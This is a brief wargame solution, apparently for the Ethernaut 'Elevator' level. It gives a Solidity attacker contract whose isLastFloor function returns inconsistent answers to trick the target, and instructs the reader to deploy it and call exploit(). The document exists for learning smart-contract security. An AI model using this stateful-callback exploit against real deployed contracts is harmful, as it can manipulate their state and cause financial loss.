Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint) external;
}

contract Exploit {

    uint floor = 0;

    function exploit(address _who) public payable {
        Elevator(_who).goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (_floor == floor){
            return true;
        }
        floor = _floor;
        return false;
    }

}
```
call exploit()
